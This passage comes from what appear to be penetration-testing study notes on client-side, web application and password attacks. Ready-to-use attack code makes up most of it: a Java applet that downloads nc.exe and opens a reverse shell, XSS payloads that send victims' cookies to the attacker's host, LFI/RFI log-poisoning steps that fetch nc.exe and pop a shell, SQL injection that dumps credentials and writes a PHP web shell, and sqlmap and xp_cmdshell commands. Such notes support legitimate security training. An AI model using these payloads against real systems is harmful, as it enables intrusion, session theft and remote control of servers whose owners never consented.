            download <span style="color:#f92672">=</span> getParameter<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">);</span>
            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>download<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 0<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
                <span style="color:#75715e">// URL parameter
</span><span style="color:#75715e"></span>                URL url <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> URL<span style="color:#f92672">(</span>download<span style="color:#f92672">);</span>
                <span style="color:#75715e">// Get an input stream for reading
</span><span style="color:#75715e"></span>                InputStream in <span style="color:#f92672">=</span> url<span style="color:#f92672">.</span><span style="color:#a6e22e">openStream</span><span style="color:#f92672">();</span>
                <span style="color:#75715e">// Create a buffered input stream for efficency
</span><span style="color:#75715e"></span>                BufferedInputStream bufIn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedInputStream<span style="color:#f92672">(</span>in<span style="color:#f92672">);</span>
                File outputFile <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span>expath<span style="color:#f92672">);</span>
                OutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedOutputStream<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span>
                        FileOutputStream<span style="color:#f92672">(</span>outputFile<span style="color:#f92672">));</span>
                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>2048<span style="color:#f92672">];</span>
                <span style="color:#66d9ef">for</span> <span style="color:#f92672">(;;)</span> <span style="color:#f92672">{</span>
                    <span style="color:#66d9ef">int</span> nBytes <span style="color:#f92672">=</span> bufIn<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">);</span>
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>nBytes <span style="color:#f92672">&lt;=</span> 0<span style="color:#f92672">)</span> <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>buffer<span style="color:#f92672">,</span> 0<span style="color:#f92672">,</span> nBytes<span style="color:#f92672">);</span>
                <span style="color:#f92672">}</span>
                out<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
                out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
                in<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
                f <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;cmd.exe /c &#34;</span> <span style="color:#f92672">+</span> expath <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; 192.168.1.23 443 -e cmd.exe&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// change to Kali IP
</span><span style="color:#75715e"></span>            <span style="color:#f92672">}</span>
        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>IOException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>
        <span style="color:#75715e">/* ended here and commented out below for bypass */</span>
        <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception exception<span style="color:#f92672">)</span>
        <span style="color:#f92672">{</span>
            exception<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>
    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">javac -source 1.7 -target 1.7 Java.java <span style="color:#75715e"># compile to class</span>
echo <span style="color:#e6db74">&#34;Permissions: all-permissions&#34;</span> &gt; /root/manifest.txt
jar cvf Java.jar Java.class <span style="color:#75715e"># compress class into jar</span>
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
jarsigner -keystore mykeystore -keypass mykeypass -storepass password123 -signedjar SignedJava.jar Java.jar signapplet
mv Java.class SignedJava.jar /var/www/html/
echo <span style="color:#e6db74">&#39;&lt;applet width=&#34;1&#34; height=&#34;1&#34; id=&#34;Java Secure&#34; code=&#34;Java.class&#34; archive=&#34;SignedJava.jar&#34;&gt;&lt;param name=&#34;1&#34; value=&#34;http://192.168.1.23:80/evil.exe&#34;&gt;&lt;/applet&gt;&#39;</span> &gt; /var/www/html/java.html
cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
</code></pre></div><h1 id="web-application-attacks">Web Application Attacks</h1>
<h2 id="essential-firefox-add-ons">Essential Firefox Add-ons</h2>
<ul>
<li>Cookie Manager+</li>
<li>Tamper Data</li>
</ul>
<h2 id="xss">XSS</h2>
<h3 id="browser-redirection-and-iframe-injection">Browser Redirection and IFRAME Injection</h3>
<p>Forcing a victim to visit a webpage. Use an IFRAME as it is stealthy. This redirection may be used to redirect a victim browser to a client side attack or to an information gathering script. Listen for the connection: <code>nc -lvp 80</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">SRC</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://[your ip]/report&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</code></pre></div><p>Tools:</p>
<ul>
<li>User Agent Parser: <a href="https://developers.whatismybrowser.com/useragents/parse/#parse-useragent">https://developers.whatismybrowser.com/useragents/parse/#parse-useragent</a> (for exploiting outdated clients)</li>
</ul>
<h3 id="stealing-cookies-and-session-information">Stealing Cookies and Session Information</h3>
<h4 id="get-request">GET Request</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Image</span>().<span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://[your ip]/bogus.php?output=&#34;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;&lt;/<span style="color:#f92672">script</span>&gt;
</code></pre></div><h4 id="post-request">POST Request</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">var http = new XMLHttpRequest();var url = &#34;/flatfilelogin/shout.php&#34;;var params = &#34;input_name=stolen<span style="color:#960050;background-color:#1e0010">&amp;</span>input_text=&#34; + document.cookie;http.open(&#34;POST&#34;, url, true);http.setRequestHeader(&#34;Content-type&#34;, &#34;application/x-www-form-urlencoded&#34;);http.send(params);
</code></pre></div><h2 id="file-inclusion">File Inclusion</h2>
<h3 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h3>
<p>Ability to &ldquo;include&rdquo; any local file in the filesystem and execute PHP code within the included files.</p>
<p>Vulnerability:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>( $_GET[<span style="color:#e6db74">&#39;LANG&#39;</span>] ) ) { $lang <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;LANG&#39;</span>];}
<span style="color:#66d9ef">else</span> { $lang <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;en&#39;</span>;}
<span style="color:#66d9ef">include</span>( $lang <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php&#39;</span> );
</code></pre></div><p>With this, you can access files that are on the system by changing the value of the <code>LANG</code> attribute and using directory path traversal. But notice in the vulnerable code, it appends <code>.php</code> to the end, to bypass that in PHP versions below 5.3, use a null byte (<code>%00</code>):</p>
<pre><code>LANG=../../../../../../../../windows/system32/drivers/etc/hosts%00
</code></pre><p>If we could get PHP code written to somewhere on the server filesystem, we can get a shell. Assuming, we can&rsquo;t directly upload a file to the remote filesystem, we can contaminate log files to include PHP code:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc 192.168.1.23 <span style="color:#ae81ff">80</span>
&lt;?php echo shell_exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;cmd&#39;</span><span style="color:#f92672">])</span>;?&gt;


HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
</code></pre></div><p>This connection results in the following text written to the Apache log files located in <code>C:\xampp\apache\logs\access.log</code>, effectively introducing PHP code into a file on the local filesystem of the webserver:</p>
<pre><code>192.168.1.23 - - [17/Apr/2013:06:22:00 -0400] &quot; &lt;?php echo shell_exec($_GET['cmd']);?&gt;&quot; 400 1047
</code></pre><p>Let&rsquo;s try including that log file and executing the malicious PHP code stored within it, by putting the pathname into the <code>LANG</code> attribute, and putting <code>ipconfig</code> in the <code>cmd</code> attribute:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=ipconfig&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><p>The result may be a little hard to see, as the entire log file will be dumped along with the command&rsquo;s output.</p>
<p>Let&rsquo;s get a shell now by transferring over &ldquo;nc.exe&rdquo; to the webserver using the TFTP technique. First, start the TFTP server on the attacker machine with <code>atftpd --daemon --port 69 /tftp</code> and copying &ldquo;nc.exe&rdquo; over to the hosting directory with <code>cp /usr/share/windows-binaries/nc.exe /tftp</code>. Now execute the <code>tftp</code> on the webserver using LFI. Remember to URL encode the command string within the &ldquo;cmd&rdquo; attribute:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=tftp+-i+[kali ip]+get+nc.exe&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><p>The webpage will start to hang for a while, as it awaits the output from the <code>tftp</code> command that is downloading &ldquo;nc.exe&rdquo;. Once done, execute the downloaded &ldquo;nc.exe&rdquo; and create a reverse shell:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;cmd=nc.exe+[kali ip]+[port]+-e+cmd.exe&amp;LANG=../../../../../../../xampp/apache/logs/access.log%00
</code></pre><h4 id="lfi-summary">LFI Summary</h4>
<h5 id="techniques">Techniques</h5>
<pre><code>param=/etc/passwd
param=/etc/passwd%00 # null byte terminate
param=../../../../../../etc/passwd%00 # directory traversal
param=php://filter/convert.base64-encode/resource=/etc/php5/apache2/php.ini%00 # filter, for files that contain bad chars PHP cannot interpret
param=expect://whoami # expect wrapper, direct code execution, not enabled by default
param=php://input # php code execution, send php code in POST data `&lt;? system('wget http://192.168.183.129/php-reverse-shell.php -O /var/www/shell.php');?&gt;`
param=/proc/self/environ # if readable, write php code in &quot;User Agent&quot; data, and it'll appear within environ
param=/proc/self/fd/0 # if readable, write php code in &quot;referer&quot; data, and it'll appear within file descriptor. make sure to brute force the fd number 0-10+
param=/var/lib/php/session # php sessions
param=/tmp/ # php sessions
</code></pre><p>Also phpinfo() pages can be exploited in LFI as well. phpinfo() script contains the values of PHP variables, INCLUDING any values set via GET, POST or uploaded FILES. Creating tmp files, getting the location of them, and performing LFI on them leads to code execution. <a href="https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></p>
<h5 id="log-poisoning">Log Poisoning</h5>
<pre><code># Default Locations
RHEL / Red Hat / CentOS / Fedora Linux Apache log file location   /var/log/httpd/access_log     /var/log/httpd/error_log
Debian / Ubuntu Linux Apache log file location                    /var/log/apache2/access.log   /var/log/apache2/error.log
FreeBSD Apache log file location                                  /var/log/httpd-access.log     /var/log/httpd-error.log

# For custom log locations, find the &quot;CustomLog&quot; and &quot;ErrorLog&quot; definitions within these files:
/usr/local/etc/apache2/httpd.conf
/etc/apache2/apache2.conf
/etc/httpd/conf/httpd.conf

# Windows web roots
C:/xampp/htdocs/
C:/wamp/www/
C:/Inetpub/wwwroot/
</code></pre><h4 id="fimap"><code>fimap</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">fimap -s -u <span style="color:#e6db74">&#39;http://192.168.1.23/classes/phpmailer/class.cs_phpmailer.php?classes_dir=&#39;</span>
</code></pre></div><h3 id="remote-file-inclusion-rfi">Remote File Inclusion (RFI)</h3>
<p>Ability to &ldquo;include&rdquo; remote files and execute PHP code within the included files. Easier to exploit, but less common than LFIs.</p>
<p>Just like getting a shell with LFI, start the TFTP server and prepare &ldquo;nc.exe&rdquo;. Also, prepare a malicious file called &ldquo;evil.txt&rdquo; and host it within the attacker&rsquo;s webserver and start apache with <code>service apache2 start</code>:</p>
<pre><code>&lt;?php echo shell_exec(&quot;tftp -i [kali ip] get nc.exe&quot;);?&gt;
</code></pre><p>Call the webpage to include &ldquo;evil.txt&rdquo; and execute the PHP code within it to download &ldquo;nc.exe&rdquo; from our machine using <code>tftp</code>. It may take a sec to download:</p>
<pre><code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;LANG=http://[kali ip]/evil.txt%00
</code></pre><p>Change &ldquo;evil.txt&rdquo; on the attacker&rsquo;s webserver to invoke the <code>nc.exe</code> command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>(<span style="color:#e6db74">&#34;nc.exe [kali ip] [port] -e cmd.exe&#34;</span>);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Prepare a listener and refresh the webpage to pop a reverse shell.</p>
<h4 id="rfi-summary">RFI Summary</h4>
<p>Alternatively, to avoid constantly changing the php file, host this instead, and visit <code>http://192.168.1.23/addguestbook.php?name=hi&amp;comment=&amp;LANG=http://[kali ip]/evil.txt%00&amp;cmd=whoami</code>. Change <code>cmd</code> to the command you want to execute:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><pre><code># Data wrapper allows for direct code execution
param=data:text/plain,&lt;?system($_GET['x']);?&gt;&amp;x=whoami
param=data:,&lt;?system($_GET['x']);?&gt;&amp;x=whoami
param=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls
</code></pre><h3 id="sql">SQL</h3>
<h4 id="simple-authentication-bypass">Simple Authentication Bypass</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>;
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> users <span style="color:#66d9ef">where</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;wronguser&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;<span style="color:#f92672">#</span><span style="color:#e6db74">&#39; and password=&#39;</span><span style="color:#f92672">?</span><span style="color:#e6db74">&#39;;
</span><span style="color:#e6db74">select * from users where name=&#39;</span>wronguser<span style="color:#e6db74">&#39; or 1=1 limit 1;#&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;?&#39;</span>; <span style="color:#f92672">#</span> <span style="color:#66d9ef">when</span> server expects <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">result</span>
</code></pre></div><h4 id="database-enumeration-and-extraction">Database Enumeration and Extraction</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=?</span>;
<span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span><span style="color:#e6db74">&#39;; # test for sql injection
</span><span style="color:#e6db74">select * from comments where id=738 order by 6; # enumerate number of columns
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,5,6; # union select with same number of columns, to see which numbers gets printed on webpage
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,@@version,6; # discover MySQL version
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,user(),6; # discover current user being used for db connection
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,table_name,6 from information_schema.tables; # dump all tables and find interesting one
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,column_name,6 from information_schema.columns where table_name=&#39;</span>users<span style="color:#e6db74">&#39;; # dump all column names from that table
</span><span style="color:#e6db74">select * from comments where id=738 union select 1,2,3,4,concat(name,0x3a,password),6 from users; # dump users information. 0x3a can be substituted with &#39;</span>:<span style="color:#e6db74">&#39;
</span></code></pre></div><h4 id="reading-files-with-sqli">Reading Files with SQLi</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,load_file(<span style="color:#e6db74">&#39;c:/windows/system32/drivers/etc/hosts&#39;</span>),<span style="color:#ae81ff">6</span>;
</code></pre></div><h4 id="writing-files-with-sqli">Writing Files with SQLi</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> comments <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#e6db74">&#34;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&#34;</span>,<span style="color:#ae81ff">6</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;c:/xampp/htdocs/backdoor.php&#39;</span>;
</code></pre></div><pre><code>192.168.1.23/backdoor.php?cmd=ipconfig
</code></pre><h4 id="mssql-xp_cmdshell-and-dumping">MSSQL Xp_Cmdshell and Dumping</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-xp-cmdshell --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc,ms-sql-xp-cmdshell.cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whoami&#39;</span> 192.168.1.23 <span style="color:#75715e"># command execution</span>
nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-tables --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc 192.168.1.23 <span style="color:#75715e"># dump tables information</span>
nmap -T4 -n -p <span style="color:#ae81ff">1433</span> --script ms-sql-query --script-args mssql.username<span style="color:#f92672">=</span>sa,mssql.password<span style="color:#f92672">=</span>abc,mssql.database<span style="color:#f92672">=</span>bankdb,ms-sql-query.query<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select * from tblCustomers;&#34;</span> 192.168.1.23 <span style="color:#75715e"># sql query</span>
</code></pre></div><h4 id="mysql-cli">MySQL CLI</h4>
<p>Low-priv shells may not be interactive, so remember to use <code>-e</code> to execute SQL queries:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mysql -uroot -pzaq1xsw2cde3 -e <span style="color:#e6db74">&#39;show databases;&#39;</span>
mysqladmin -u root password YOURNEWPASSWORD <span style="color:#75715e"># resetting root password, good for post exploitation, may not work all the time</span>
</code></pre></div><p>Unlike MSSQL, MySQL can&rsquo;t directly execute commands, but with UDF (user defined funtion), command execution will be possible.</p>
<ul>
<li>mysqladmin -u root password YOURNEWPASSWORD</li>
<li><a href="https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload">https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload</a></li>
<li><a href="http://bernardodamele.blogspot.sg/2009/01/command-execution-with-mysql-udf.html">http://bernardodamele.blogspot.sg/2009/01/command-execution-with-mysql-udf.html</a></li>
<li><a href="https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/">https://hackmag.com/security/hacking-mysql-databases-methods-and-tools/</a></li>
</ul>
<h4 id="oracle">Oracle</h4>
<p>Four things to connect to an Oracle DB:</p>
<ol>
<li>
<p>IP</p>
</li>
<li>
<p>Port</p>
</li>
<li>
<p>Service Identifier (SID) (Database)</p>
</li>
<li>
<p>Username/Password</p>
</li>
<li>
<p>Determine Oracle version</p>
</li>
</ol>
<ul>
<li>nmap</li>
<li>auxiliary/scanner/oracle/tnslsnr_version</li>
</ul>
<ol start="2">
<li>Determine Oracle SID</li>
</ol>
<ul>
<li>oscanner</li>
<li>auxiliary/scanner/oracle/sid_enum</li>
<li>auxiliary/scanner/oracle/sid_brute</li>
</ul>
<ol start="3">
<li>Guess/Bruteforce User/Pass</li>
</ol>
<ul>
<li>oscanner</li>
<li>auxiliary/scanner/oracle/oracle_login</li>
</ul>
<ol start="4">
<li>Privilege Escalation via PL/SQL Injection</li>
</ol>
<ul>
<li>auxiliary/sqli/oracle/lt_findricset_cursor</li>
</ul>
<ol start="5">
<li>Manipulate Data/Post Exploitation</li>
<li>Cover Tracks</li>
</ol>
<p>Resources:</p>
<ul>
<li>Oracle Hacking Methodology with Metasploit: <a href="http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf">http://www.blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</a></li>
<li>Sqlplus and code execution example: <a href="https://www.adampalmer.me/iodigitalsec/2013/08/12/first-steps-in-oracle-penetration-testing/">https://www.adampalmer.me/iodigitalsec/2013/08/12/first-steps-in-oracle-penetration-testing/</a></li>
<li>Setting up Oracle in Kali: <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux">https://github.com/rapid7/metasploit-framework/wiki/How-to-get-Oracle-Support-working-with-Kali-Linux</a> (felt troublesome, didn&rsquo;t install)</li>
<li>Setting up Oracle in Kali 2.0: <a href="https://blog.zsec.uk/msforacle/">https://blog.zsec.uk/msforacle/</a></li>
</ul>
<p>Tools:</p>
<ul>
<li>Oscanner: <a href="https://tools.kali.org/vulnerability-analysis/oscanner">https://tools.kali.org/vulnerability-analysis/oscanner</a>
<ul>
<li><code>oscanner -s 192.168.1.23 -P 1521</code></li>
</ul>
</li>
<li>DBPwAudit: <a href="https://tools.kali.org/vulnerability-analysis/dbpwaudit">https://tools.kali.org/vulnerability-analysis/dbpwaudit</a></li>
</ul>
<h4 id="other-notes">Other Notes</h4>
<h3 id="web-application-proxies">Web Application Proxies</h3>
<ul>
<li>Firefox &gt; Alt &gt; Tools &gt; Tamper Data &gt; Start Tamper</li>
<li>BurpSuite</li>
</ul>
<h4 id="burpsuite">BurpSuite</h4>
<p>Wonderful tool, great for SQLi, RFI, LFI, remote code execution, and nearly all web attacks.</p>
<ul>
<li>Proxy</li>
<li>Repeater
<ul>
<li>Ctrl-r to send request to repeater</li>
<li>Ctrl-g to go in repeater, manually set in User Options (Tab) &gt; Misc &gt; Hotkeys &gt; Edit hotkeys &gt; Issue Repeater request &gt; Ctrl-g</li>
<li>Ctrl-u to URL encode</li>
</ul>
</li>
</ul>
<h3 id="automated-sql-injection-tools">Automated SQL Injection Tools</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sqlmap -u http://192.168.1.23 --crawl<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># crawls link with depth 1 and automatically find GET SQLi</span>
sqlmap -u http://192.168.1.23/comment.php?id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> --dbms<span style="color:#f92672">=</span>mysql --dump --threads<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>
sqlmap -u http://192.168.1.23/comment.php?id<span style="color:#f92672">=</span><span style="color:#ae81ff">738</span> --dbms<span style="color:#f92672">=</span>mysql --os-shell
sqlmap -u http://192.168.1.23/login.php --data<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username=john&amp;password=smith&#39;</span> <span style="color:#75715e"># POST using data</span>
sqlmap -r login_request -p username,password <span style="color:#75715e"># POST, using a BurpSuite request</span>
</code></pre></div><h1 id="password-attacks">Password Attacks</h1>
<h2 id="preparing-for-brute-force">Preparing for Brute Force</h2>
<h3 id="dictionary-files">Dictionary Files</h3>
<p><code>/usr/share/wordlists/</code></p>
<h3 id="key-space-brute-force">Key-space Brute Force</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">crunch <span style="color:#ae81ff">6</span> <span style="color:#ae81ff">6</span> 0123456789ABCDEF -o crunch1.txt <span style="color:#75715e"># length 6 0-9A-F</span>
crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4</span> -f /usr/share/crunch/charset.lst mixalpha -o mixedalpha.txt <span style="color:#75715e"># length 4 a-zA-Z</span>
crunch <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> -p test ing <span style="color:#ae81ff">123</span> <span style="color:#75715e"># crunch will find all combinations of those 3 words, eg. 123ingtest</span>
</code></pre></div><p>If a pattern is found within passwords you cracked like:</p>
<pre><code>david: Abc$#123
mike: Jud()666
Judy: Hol&amp;&amp;278
</code></pre><p>We can generate a customized password list:</p>
<pre><code># @ - Lower case alpha characters
# , - Upper case alpha characters
# % - Numeric characters
# ^ - Special characters including space

crunch 8 8 -t ,@@^^%%% # this will generate 160GB of data
</code></pre><h3 id="pwdump-and-fgdump">Pwdump and Fgdump</h3>
<p>Password Hash Types in Security Accounts Manager (SAM) Database:</p>
<ul>
<li>LAN Manager (LM)
<ul>
<li>DES</li>
<li>Windows NT-2003</li>
<li>Passwords longer than 7 chars split into two strings and is hashed separately</li>
<li>Passwords converted to uppercase before hashing</li>
<li>No salt</li>
</ul>
</li>
<li>NT LAN Manager (NTLM)
<ul>
<li>MD4</li>
<li>Windows Vista+</li>
<li>No limit to two 7 char parts</li>
<li>Case sensitive</li>
<li>No salt</li>
</ul>
</li>
</ul>
<p>SAM db cannot be copied while OS is running, however in-memory attacks to dump the hashes can be mounted using various techniques. Pwdump and fgdump are good examples of tools that are able to perform in-memory attacks, as they inject a DLL containing the hash dumping code into the Local Security Authority Subsystem (LSASS) process, which has the necessary privileges to extract the hashes.</p>
<p>Fgdump and pwdump are similar, but fgdump attempts to kill local AV before attempting to dump the hashes and handle cached passwords and protected storage data as well. <a href="http://foofus.net/goons/fizzgig/">http://foofus.net/goons/fizzgig/</a></p>
